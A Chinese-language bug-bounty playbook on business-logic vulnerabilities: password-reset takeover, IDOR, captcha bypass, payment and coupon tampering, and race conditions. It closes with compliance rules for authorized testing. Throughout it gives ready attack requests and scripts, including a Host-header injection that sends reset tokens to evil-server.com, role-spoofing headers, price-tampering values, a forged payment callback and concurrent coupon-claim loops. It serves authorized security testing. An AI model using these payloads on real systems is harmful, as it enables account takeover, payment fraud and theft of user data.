# 业务逻辑漏洞（Business Logic）

> 程序按预期工作，但「预期本身不对」。不是注入、不是 RCE，没有固定 payload，靠的是**流程理解 + 篡改 + 重放**。很难被 WAF 检测，大厂因业务复杂而高频暴露；涉及资金/身份/越权时是赏金最高的类别之一。本 playbook 覆盖：密码重置 / 支付与优惠券 / 验证码 / 越权（IDOR）/ 竞态条件。

**取材来源**（本文件内容改编自，非整库复制）：
- [MyuriKanao/src-hunter-skill](https://github.com/MyuriKanao/src-hunter-skill)（00-index / 11-business-logic）
- [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter)
- [SnailSploit/Claude-Red](https://github.com/SnailSploit/Claude-Red)
- 权威公开源：OWASP WSTG-BUSL / PortSwigger Web Security Academy（business logic track）/ HackTricks

---

## 1. 触发信号

- **密码重置**：`/reset` `/forgot` `/findpwd` `/sms`；多步骤流程；验证码/ token 回显、可重放、与用户解绑。
- **越权**：`/user/{id}` `/order/{id}`；改 ID 后仍 200 且返回他人数据；Header/Cookie 直接当身份（`X-User-Role` `role=admin`）。
- **支付/优惠券**：`/order/create` `/pay` `/checkout` `/coupon`；客户端提交 `price`/`amount` 且服务端不重算；回调无签名校验。
- **验证码**：`/sendSms` `/captcha` `/verify`；4–6 位纯数字 + 无频率限制；`status` 字段控制下一步。
- **竞态**：优惠券/余额/邀请/限购等「先检查后使用」（TOCTOU）的一次性操作。

## 2. 高频入口点（按 WooYun 8,292 案例归类，见 src-hunter logic-flaws/00-index.md §2）

| 类型 | 入口特征 | 关键参数 |
|---|---|---|
| 密码重置 | `/reset` `/forgot` `/findpwd` `/sms` | `phone` `username` `code` `token` `step` |
| 越权 | `/user/{id}` `/order/{id}` | `id` `uid` `oid` `addrid` `hotelid` |
| 角色/提权 | `/role` `/permission` `/profile` | `role` `aid` `isAdmin` `level` |
| 支付/订单 | `/order/create` `/pay` `/checkout` | `price` `amount` `total` `count` `couponCode` |
| 验证码 | `/sendSms` `/captcha` `/verify` | `code` `captcha` `smsCode` |
| 优惠券/积分 | `/coupon` `/exchange` `/redeem` | `code` `couponId` `points` |

**URL 特征**（Claude-BugHunter hunt-business-logic）：`/checkout` `/order` `/subscribe` `/payment` `/verify` `/confirm` `/callback` `/webhook`，以及误公开的 `/internal` `/employee` `/staff` `/admin`。

## 3. 探测顺序（从最无害 → 最有杀伤力）

1. **密码重置 4 模式**（来自 WooYun 22 案例，见 §4.1）：先抓发送验证码的响应搜 `verifyCode`/`smsCode`/`code`/`captcha`；再用自己的码去验证他人；再试流程跳跃；最后试凭证参数可控。**始终只重置自己的两个测试账号**。
2. **越权（IDOR）**：用账号 A 记下资源 ID，用账号 B 重发同一请求把 ID 换成 A 的，200 + 返回 A 数据 = 水平越权；注册普通+管理员两账号，用普通 token 直调管理接口 = 垂直越权。工具 Burp `Autorize` 插件自动比较两个 session。
3. **验证码绕过**：连续失败 5 次看图是否不变（固定值可爆破）；测删除/空/null 验证码字段；测万能码 `0000`/`1234`/`8888`。
4. **支付/优惠券**：每个金额值都试（`0`/`0.01`/`-100`/`1e-10`/`"0.01"`/`null`/`{"$gt":0}`/`[299,0.01]`）；数量负数/0/溢出；优惠券叠加/负折扣；重放支付回调。
5. **竞态**：并发 50–100 次同一 coupon/提现/注册，验证是否多次生效。
6. **最小证据**：1–3 条样本即止，全部脱敏，不实际下单实物/激活卡券/重置真实用户。

## 4. Payload 区（每条标注出处）

### 4.1 密码重置 4 模式 `[本地 src-hunter logic-flaws/00-index.md §3.1]`

**模式 A：验证码回显在响应**

```http
POST /api/sendSmsCode HTTP/1.1
phone=13888888888
→ 响应：{"code":0,"data":{"verifyCode":"123456"}}
```

**模式 B：验证码与用户解绑**——用自己手机收码，把 `phone` 改成受害者提交，码仍通过。案例：某记账 APP（影响 8000W 用户）。

**模式 C：流程跳跃**——正常 4 步走完一次记录每步 URL，直接发起第 3 步请求看是否需要前置 token。案例：某户外用品商城（wooyun-2014-054890）。

**模式 D：凭证参数可控**

```http
POST /resetPassword HTTP/1.1
username=victim&newPassword=hacked123
```

**Host 头注入窃取重置链接** `[本地 src-hunter 11-business-logic.md]`

```http
POST /api/password/reset HTTP/1.1
Host: evil-server.com
X-Forwarded-Host: evil-server.com
{"email": "victim@target.com"}
→ 受害者收到的重置链接变为 https://evil-server.com/reset?token=abc123
```

**重置令牌弱随机**——收集多个 token 分析规律（时间戳+用户名、`md5(timestamp_email)`）可预测。`[本地 src-hunter 11-business-logic.md]`

### 4.2 越权（IDOR）`[本地 src-hunter logic-flaws/00-index.md §3.2 / 11-business-logic.md]`

**水平越权**：`GET /api/address/edit/?addid=100001`（A）→ 改成 `100002`（B）→ 200 + B 数据 = IDOR。

**垂直越权**：`POST /updateUser` 改 `user.aid=3`（普通）→ `user.aid=1`（超管）。枚举角色：`1=超管, 2=管理员, 3=普通用户`。

**Header/Cookie 注入越权**：

```
X-User-Role: admin
X-User-Id: 1
X-Original-User: admin
X-Forwarded-User: admin
Cookie: role=admin; isAdmin=1; userId=1
```

**IDOR 测试矩阵**：

| 操作 | 探针 | 风险 |
|---|---|---|
| 读 | 改 ID 查他人资源 | 中/高 |
| 改 | 改 ID 改他人资源 | 高 |
| 删 | 改 ID 删他人资源 | 严重（不可逆，禁实测删除！） |
| 创建 | 改 owner 字段 | 高 |

**参数污染/编码绕过** `[本地 src-hunter 11-business-logic.md]`：双参数 `user_id=1001&user_id=1002`、JSON 键覆盖 `{"user_id":1001,"user_id":1002}`、数组 `user_id[]=1001&user_id[]=1002`；Base64 `MTAwMQ==`、Hex `0x3E9`、负数 `-1`、溢出 `2147483647`。

### 4.3 验证码绕过（20 案例）`[本地 src-hunter logic-flaws/00-index.md §3.3 / 11-business-logic.md]`

- **不刷新/可重用**：连续失败 5 次验证码图不变 → 固定值爆破密码。
- **4–6 位纯数字 + 无频率限制**：Burp Intruder 100 线程爆破（某品牌商城 5 位码 30 秒爆完）。
- **客户端验证/响应篡改**：Burp 拦响应把 `{"status":"0","msg":"验证码错误"}` 改成 `{"status":"1","msg":"成功"}`，SPA 进入下一步。案例：健一网（wooyun-2015-0139590）。
- **删除/空/null 参数**：`{"username":"admin","password":"pass"}` 去掉 `captcha`；或 `captcha":""`、`captcha":null`。
- **万能码**：`0000` `1111` `1234` `8888` `9999` `6666` `000000` `123456`；调试后门 `{"debug":true}` `{"code":"master_code"}`。
- **响应泄露**：响应体 `{"captcha":"8462"}`、响应头 `X-Captcha-Code: 8462`、`Set-Cookie: captcha=ODQ2Mg==`（base64）。

### 4.4 支付 / 优惠券（9 案例）`[本地 src-hunter logic-flaws/00-index.md §3.4 / Claude-Red offensive-business-logic]`

**价格篡改**（每个值都试）：

```http
POST /order/create HTTP/1.1
{"productId":"12345","quantity":1,"price":0.01}
```

```
price = 0 / 0.01 / -100 / 1e-10 / "0.01"(字符串) / null / {"$gt":0}(MongoDB注入) / [299,0.01](数组)
```

**数量篡改**：`count = -1`（负→退款反向触发）/ `0`（免费下单）/ `9999999999`（整数溢出）。

**货币混淆** `[Claude-Red offensive-business-logic]`：`{"amount":100,"currency":"JPY"}` 用 100 日元买 100 美元商品；`VND`/`BTC` 同理——找缺失的货币归一化。

**优惠券滥用/叠加**：

```http
POST /api/cart/coupon { "code": "SAVE50" }    # 重复应用是否叠加？
POST /api/cart/coupon { "code": "save50" }    # 大小写变体另算一次？
POST /api/cart/coupon { "code": "SAVE50 " }   # 空白变体？
POST /api/admin/coupon { "code": "X", "percent": -50 }   # 负折扣（若 admin 可达）
```

组合满减订单后取消 A 商品 → 以极低价购得 B 商品（src-hunter 案例）。

**重放支付回调**：

```http
POST /pay/notify
sign=xxx&order_id=123&status=success&amount=100
```

同一 sign 重放 → 若服务端不查 order 状态，可能多次发货。伪造回调 `[Claude-BugHunter hunt-business-logic]`：

```bash
curl -X POST https://target.com/payment/callback \
  -d '{"status":"success","amount":"0.01","order_id":"12345","transaction_id":"fake-txn"}'
```

**参数污染**：`POST /order/create?price=299.00&price=0.01` 或 body `price[]=299.00&price[]=0.01`。

### 4.5 竞态条件（race / TOCTOU）`[本地 src-hunter logic-flaws/00-index.md §3.5 / 11-business-logic.md / Claude-BugHunter hunt-business-logic]`

| 场景 | 探针 |
|---|---|
| 优惠券双花 | 并发 50 次同一 coupon code |
| 余额超扣 | 并发提现/转账，余额 100 每次提 100 |
| 邀请奖励刷量 | 并发注册新用户 + 邀请码 |
| 验证码爆破 | 并发提交不同 code |
| 限购抢购 | 并发下单 |
| 唯一性破坏 | 并发注册同一用户名（`existsByUsername` 后再 insert） |

工具：Burp Intruder（"Send N requests in parallel"）、Turbo Intruder（精确并发，`gate` 机制确保同发）、自写 Python `threading`/`asyncio`/Go goroutine。Turbo Intruder 模板 `[本地 src-hunter 11-business-logic.md]`：

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=True)
    for i in range(50):
        engine.queue(target.req, gate="race1")
    engine.openGate("race1")
```

### 4.6 Bypass 矩阵 `[本地 src-hunter logic-flaws/00-index.md §4 / Claude-Red]`

| 拦截 | 绕过 |
|---|---|
| 单 IP 频率限制 | 多 IP / 代理池 / `X-Forwarded-For` 注入 |
| 同一手机号频率 | 号码后加点 `13888888888.` / `+8613888888888` / `013888888888` |
| Token 一次性 | 抓发包前后 token，看是否真的失效 |
| 单 IP 限速（Claude-Red） | 轮换 `X-Forwarded-For` `X-Real-IP` `True-Client-IP` `CF-Connecting-IP` |
| 验证码图形 | 调验证码识别 API（仅自测合规情况下） |
| IP 限速 + HTTP/2 | 单连接多路复用并发绕过连接数限制 `[本地 src-hunter 11-business-logic.md]` |

## 5. 工具用法

```bash
# 越权自动对比（Burp 插件 Autorize）
# 竞态并发
# 参数爆破：ffuf 或 Burp Intruder（100 线程验证码爆破仅自测账号）

# 价格字段 fuzz（自测账号，单请求逐个值）
for v in 0 0.01 -100 1e-10 "0.01" null '{"$gt":0}' '[299,0.01]'; do
  curl -s -X POST "https://target/api/order/create" \
    -H "Content-Type: application/json" -H "Authorization: Bearer $T" \
    -d "{\"productId\":\"X\",\"quantity\":1,\"price\":$v}";
done

# 竞态（50 并发）
seq 1 50 | xargs -P 50 -I{} curl -s -X POST "https://target/api/coupon/claim" \
  -H "Authorization: Bearer $T" -d '{"coupon_id":"C001"}' -o /dev/null -w "%{http_code}\n"
```

> 纪律：越权用 `Autorize` 先自动比对再手工复现；竞态控制在 50–100 并发（1000+ rps 视为 DoS）；金额篡改演示到「订单生成 + 金额异常」即停，不进入支付链路。

## 6. 证据要求

**「已确认」必须满足**：越权需 A/B 两个受控账号 + 200 返回对方数据（最后仅用 1 个随机 ID 证明可遍历性）；价格篡改需「服务端响应订单总额 = 篡改值 + 支付页截图」（不实际支付）；竞态需「限领 1 张实领多张」或余额多次变化。

**越权 PoC 模板** `[本地 src-hunter logic-flaws/00-index.md §7.2]`：

```markdown
## Step 1：A 查询自己订单（基线）
GET /api/orders/100  Authorization: A_token  → 200，返回 A 的订单
## Step 2：A 查询 B 的订单（漏洞证明）
GET /api/orders/200  Authorization: A_token  → 200，返回 B 的订单内容
## Step 3：用陌生 user_id=99999 证明可遍历（仅取 1 条，已脱敏）
```

**CVSS 参考** `[本地 src-hunter logic-flaws/00-index.md §7.4]`：

```
垂直越权→提权 admin      AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H = 8.8
水平越权→读他人 PII      AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N = 6.5
密码重置接管             AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N = 9.1
价格篡改 0.01            AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N = 6.5（按业务影响升降）
验证码爆破登录           AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N = 9.1
```

## 7. 合规边界 / 不要做的事

- **禁**：用支付篡改实际下单实物商品（即使 0.01 元）。改用测试环境、数字商品（不激活）、或演示到「订单生成 + 金额异常」即停。
- **禁**：批量 IDOR 拖库。最多 1–3 条样本，且全部脱敏。
- **禁**：用密码重置漏洞重置真实用户密码。重置自己的两个测试账号即可。
- **禁**：用越权账号执行写/删/改操作，只读证明；**严禁实测删除他人数据**。
- **禁**：撞库使用 SRC 平台之外的真实数据库；竞态发起 1000+ rps。
- **脱敏**：报告不含他人 PII 原文/订单号/手机号/地址（只留前 2 + 后 2 字符）；不用真实第三方账号测到数据后继续。
- **报告必含**：意图流程 vs 实际流程的对比、每执行一次的资金损失量化、以及正确修复层（状态机校验而非仅输入校验）`[Claude-Red offensive-business-logic]`。
